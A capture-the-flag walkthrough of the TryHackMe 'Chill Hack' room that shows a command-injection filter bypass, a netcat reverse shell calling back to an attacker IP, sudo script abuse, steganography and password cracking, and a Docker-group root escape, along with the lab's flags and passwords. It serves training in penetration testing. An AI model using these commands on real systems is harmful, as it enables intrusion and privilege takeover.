# TryHackMe-Chill-Hack-Complete-Walkthrough
This walkthrough provides a comprehensive, professional analysis of the **Chill Hack** machine on TryHackMe.


# TryHackMe: Chill Hack — Penetration Testing Write-Up

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-blue)
![Target](https://img.shields.io/badge/OS-Linux-green)
![Category](https://img.shields.io/badge/Category-Web%20%7C%20Privilege%20Escalation-orange)

---

# Machine Information

| Category       | Details                                                                                            |
| -------------- | -------------------------------------------------------------------------------------------------- |
| Platform       | TryHackMe                                                                                          |
| Room           | Chill Hack                                                                                         |
| Difficulty     | Easy                                                                                               |
| Target OS      | Linux                                                                                              |
| Primary Skills | Web Exploitation, Command Injection, Steganography, Password Cracking, Docker Privilege Escalation |

---

# Objective

The objective of this challenge was to compromise the target Linux machine by identifying vulnerable services, gaining initial access through a web vulnerability, escalating privileges through misconfigurations, and finally obtaining root-level access.

---

# Attack Chain Summary

The complete exploitation path followed:

```
Reconnaissance
      |
      v
Web Directory Enumeration
      |
      v
Command Injection in Web Terminal
      |
      v
Reverse Shell as www-data
      |
      v
Sudo Abuse (.helpline.sh)
      |
      v
Privilege Escalation to apaar
      |
      v
Steganography Extraction
      |
      v
Password Cracking
      |
      v
Credential Reuse Attack
      |
      v
Docker Group Privilege Escalation
      |
      v
Root Access
```

---

# Network Enumeration

## Nmap Scan

The initial scan was performed using Nmap with service and version detection.

```bash
nmap -sC -sV <target_ip>
```

### Discovered Services

| Port | Service | Purpose               |
| ---- | ------- | --------------------- |
| 21   | FTP     | File Transfer Service |
| 22   | SSH     | Remote Login          |
| 80   | HTTP    | Web Application       |

The HTTP service was identified as the main attack surface.

---

# Web Enumeration

Directory enumeration was performed using Gobuster:

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```

A hidden directory was discovered:

```
/secret
```

Accessing this directory revealed a web-based command execution interface.

---

# Initial Access — Web Command Injection

The `/secret` page contained a command terminal.

Testing basic commands:

```bash
id
pwd
ls
sudo -l
```
<img width="1899" height="934" alt="Screenshot_2026-06-11_04_36_17" src="https://github.com/user-attachments/assets/f1b2fd49-a384-492f-a5fa-731e725223db" />
<img width="1899" height="930" alt="Screenshot_2026-06-10_13_56_34" src="https://github.com/user-attachments/assets/ada2cb4e-ce4d-47b4-bdca-8e9364d562f5" />
<img width="1920" height="933" alt="Screenshot_2026-06-10_13_02_09" src="https://github.com/user-attachments/assets/71eaf298-3392-4379-b2b0-bcc4a027f99e" />





Some commands were filtered.

However, command filtering could be bypassed using special characters.

Example:

Blocked:

```bash
cat /etc/passwd
```

Allowed:

```bash
"cat" /etc/passwd
```

The application filtered command names but failed to prevent command execution through shell interpretation.
During command injection testing, I identified that the application was filtering certain command patterns. However, the filtering mechanism could be bypassed by using shell syntax variations such as adding double quotes around command names.

---

# Reverse Shell

The original reverse shell payload failed:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.133.71 4444 > /tmp/f
```

The payload was modified to bypass filtering:

```bash
"rm" /tmp/f; "mkfifo" /tmp/f; "cat" /tmp/f | /bin/sh -i 2>&1 | "nc" 192.168.133.71 4444 > /tmp/f
```

A Netcat listener was started:

```bash
nc -lvnp 4444
```

A reverse shell connection was received.

Current user:

```bash
www-data
```

---
## Finding the User Flag — Helpdesk Script Exploitation

After gaining access to the target system as the `www-data` user, directory enumeration inside the `/home/apaar` directory revealed the presence of the user flag file `local.txt`. However, the file could not be read directly because the `www-data` user did not have the required permissions.

To bypass this restriction, the available sudo permissions were checked. A passwordless sudo configuration was discovered that allowed `www-data` to execute the helpdesk script as the `apaar` user:

```bash
sudo -u apaar /home/apaar/.helpline.sh
```

Upon analyzing the script, it was found to be vulnerable to command injection because it directly executed user-provided input without proper validation or sanitization. By interacting with the script prompts, the username was set as `root` and the message field was used to inject the command:

```bash
cat local.txt
```
<img width="882" height="258" alt="user flag" src="https://github.com/user-attachments/assets/b856228a-d851-4d4e-82a5-f4a272f66a18" />

 The user flag was successfully obtained:

```
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```





---

# Privilege Escalation 1 — www-data to apaar

## Sudo Permission Enumeration

Checking sudo permissions:

```bash
sudo -l
```

Output:

```
User www-data may run the following commands:

(apaar : ALL) NOPASSWD:
/home/apaar/.helpline.sh
```

The user `www-data` could execute `.helpline.sh` as `apaar`.

---

# Vulnerable Script Analysis

File:

```bash
/home/apaar/.helpline.sh
```

Contents:
<img width="763" height="272" alt="helpline sh" src="https://github.com/user-attachments/assets/72acbdca-d9f8-44fd-99fe-ba3ee931ee44" />

```bash
#!/bin/bash

echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person, Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

## Vulnerability

The script directly executes user-controlled input:

```bash
$msg
```

No validation or sanitization was implemented.

This allowed command execution with `apaar` privileges.

---

Execute the script:
<img width="802" height="208" alt="apaar bin" src="https://github.com/user-attachments/assets/ef4bde9b-151c-472e-b118-657eb8f053f9" />

```bash
sudo -u apaar /home/apaar/.helpline.sh

Enter the person whom you want to talk with: /bin/sh

Please enter your message: /bin/sh


```

A shell was obtained as:

```
apaar
```

---

# Steganography Analysis

During source code review:

```
/var/www/files/hacker.php
```

A hidden comment was found:

```
Look in the dark! You will find your answer
```

This indicated hidden information inside images.

The image:
<img width="1070" height="176" alt="images" src="https://github.com/user-attachments/assets/2d650162-bcec-4bb4-8adc-62cf12cc5dab" />

```
hacker-with-laptop_23-2147985341.jpg
```

was extracted for analysis.

---

# Extracting Hidden Data
<img width="1034" height="144" alt="image sendingpython" src="https://github.com/user-attachments/assets/d8c36535-693f-469e-9250-cbb004b50ccd" />


Initial attempt:

```bash
binwalk -e image.jpg
```

failed.

The image was analyzed using Steghide:

```bash
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```

No passphrase was required.

Extracted file:

```
backup.zip
```

---

# Password Cracking ZIP Archive

Crack password using rockyou.txt:

```bash
fcrackzip -b -D -p /usr/share/wordlists/rockyou.txt -u backup.zip
```
<img width="766" height="276" alt="fcrackzip" src="https://github.com/user-attachments/assets/d89b49b2-e91c-4682-b448-f6ff6c170253" />


Result:

```
PASSWORD FOUND!!!!: pw == pass1word
```

Extract archive:

```bash
unzip backup.zip
```

Extracted file:

```
source_code.php
```

---

# Base64 Credential Discovery

Inside `source_code.php`:
<img width="1259" height="956" alt="sourcecodep" src="https://github.com/user-attachments/assets/4bcf911d-2ca3-4a1c-ab93-5ef6cdecbbfa" />


```php
if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
```

Decode:

```bash
echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
```
<img width="551" height="86" alt="idontknowpassword" src="https://github.com/user-attachments/assets/74d610cf-4174-4256-84b1-c6c8da4f3f08" />


Decoded password:

```
!d0ntKn0wmYp@ssw0rd
```

This credential belonged to:

```
anurodh
```

Login:

```bash
su anurodh
```
<img width="711" height="95" alt="anurodh" src="https://github.com/user-attachments/assets/f158cba1-41ba-4927-aada-fb7c92a2b8ef" />

---
---
---
---

⚠️ **RECONNAISSANCE NOTE:** The following section details a deep enumeration rabbit hole. While we successfully decrypted database credentials and cracked system hashes, this entire path turned out to be a clever misdirection by the lab creator. Navigating these database steps is completely unnecessary for achieving root permissions, but it is documented below for full transparency of the penetration testing process.



# Database Credential Discovery

Reviewing:

```
/var/www/files/index.php
```
<img width="1066" height="993" alt="indexphp" src="https://github.com/user-attachments/assets/02e4faa4-8875-4801-a4d3-2406b9394b79" />


revealed database credentials:

```php
$con = new PDO(
"mysql:dbname=webportal;host=localhost",
"root",
"!@m+her00+@db"
);
```

---

# Database Enumeration

Login:

```bash
mysql -u root -p'!@m+her00+@db'
```
<img width="893" height="339" alt="mysql login" src="https://github.com/user-attachments/assets/9649ce29-60cf-47ef-b179-ce26c9141ec7" />


Select database:
<img width="789" height="771" alt="mysql database" src="https://github.com/user-attachments/assets/a0d6f6ad-4029-43b1-9ce8-2d9108ad9890" />


```sql
USE webportal;
```

View tables:

```sql
SHOW TABLES;
```

Retrieve users:

```sql
SELECT * FROM users;
```

Output:

```
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
| 1  | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
| 2  | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
```

---

# MD5 Hash Cracking

The hash:

```
7e53614ced3640d5de23f111806cc4fd
686216240e5af30df0501e53c789a649 
```

was cracked using John the Ripper.

```bash
john --format=raw-md5 \
--wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Recovered password:

```
dontaskdonttell
```
<img width="898" height="255" alt="hash password" src="https://github.com/user-attachments/assets/ddfdb932-b12d-4486-9f98-2691bc78d9b7" />

---

# User Account Discovery

Attempting:

```bash
su aurick
```

failed because it was a misleading
Failed Pivot Attempt / Enumeration Rabbit Hole



---
---
---
---

# Final Privilege Escalation — Docker Group Abuse

Checking groups:

```bash
id
```

Output:

```
uid=1002(anurodh)
gid=1002(anurodh)
groups=1002(anurodh),999(docker)
```

The user belonged to the Docker group.

Docker access provides root-level control because containers can mount the host filesystem.

---

# Docker Escape

Exploit:(search in gtfobins)

<img width="922" height="117" alt="root acess" src="https://github.com/user-attachments/assets/7c3208f9-608b-4f1d-b650-4ad47f0a7908" />

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```


The shell changed to:

```
#
```

Root access achieved.

---

# Capturing Root Flag

Navigate:

```bash
cd /root
```

Read flag:

```bash
cat proof.txt
```
<img width="1432" height="754" alt="root flag" src="https://github.com/user-attachments/assets/11cc20c0-0886-4972-bf5a-edc547aa4faa" />

Output:

```
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}

Congratulations! You have successfully completed the challenge.
```

---

# Vulnerabilities Identified

| Vulnerability                 | Impact                    |
| ----------------------------- | ------------------------- |
| Command Injection             | Initial remote access     |
| Unsafe Shell Script Execution | User privilege escalation |
| Hidden Credentials            | Account compromise        |
| Weak Password Hashing (MD5)   | Password recovery         |
| Password Reuse                | Lateral movement          |
| Docker Group Misconfiguration | Root compromise           |
| Hardcoded Database Passwords  | Sensitive data exposure   |

---



# Lessons Learned

This machine demonstrates how multiple small security issues can combine into a complete system compromise:

* Weak input filtering can lead to remote command execution.
* Poor privilege management allows lateral movement.
* Hidden credentials can expose sensitive accounts.
* Password reuse creates additional attack paths.
* Docker misconfiguration can result in complete root compromise.

---


**Platform:** TryHackMe
**Room:** Chill Hack
**Category:** Linux Privilege Escalation / Web Exploitation
